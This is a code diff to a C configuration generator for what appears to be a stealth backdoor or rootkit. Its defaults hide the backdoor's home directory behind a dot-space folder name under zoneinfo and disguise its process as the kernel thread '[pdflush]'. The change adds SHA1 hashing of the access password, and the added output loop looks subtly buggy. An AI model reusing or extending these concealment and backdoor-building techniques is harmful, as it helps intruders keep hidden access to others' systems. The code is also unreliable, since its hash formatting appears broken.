@@ -1,17 +1,21 @@
 #include <stdio.h>
 #include <termios.h>
 #include <string.h>
+#include <sha1.h>
 
 #define PASSLENGTH 256
 #define INPUTLENGTH 512
 #define DEFAULTHOME "/usr/share/zoneinfo/posix/America/Indiana/. /"
-#define PROCNAME "[pdflush]"
+#define PROCNAME "[pdflush]\0"
 
 int main(int argc, char *argv[]) {
 
+    int i;
     struct termios old, new;
+    sha1_context sha;
 	char pass1[PASSLENGTH], pass2[PASSLENGTH];
 	char input[INPUTLENGTH];
+    unsigned char sha1_pass[20];
 
 	// Hide password while typing
     tcgetattr(0, &old);
@@ -40,7 +44,13 @@ int main(int argc, char *argv[]) {
 		}
 	}
 	pass1[strlen(pass1) - 1] = '\0';
-	printf("#define PASSWORD \"%s\"\n", pass1);
+    sha1_starts(&sha);
+    sha1((unsigned char *)pass1, strlen(pass1), sha1_pass);
+	printf("#define PASSWORD \"");
+    for (i = 0; i < 20; i++) {
+        printf("\\x%2x", sha1_pass[i]);
+    }
+    printf("\"\n");
 
 	// Get home directory
 	fprintf(stderr, "[*] Enter the home directory [%s]: ", DEFAULTHOME); 
@@ -59,7 +69,7 @@ int main(int argc, char *argv[]) {
     	strcpy(input, PROCNAME);
 	else 
 		input[strlen(input) - 1] = '\0';
-	printf("#define PROCNAME \"%s\"\n", input);
+	printf("#define PROCNAME \"%s\\0\"\n", input);
 
 	// Debug	
 	fprintf(stderr, "[*] Enable debuging information? [no]: "); 
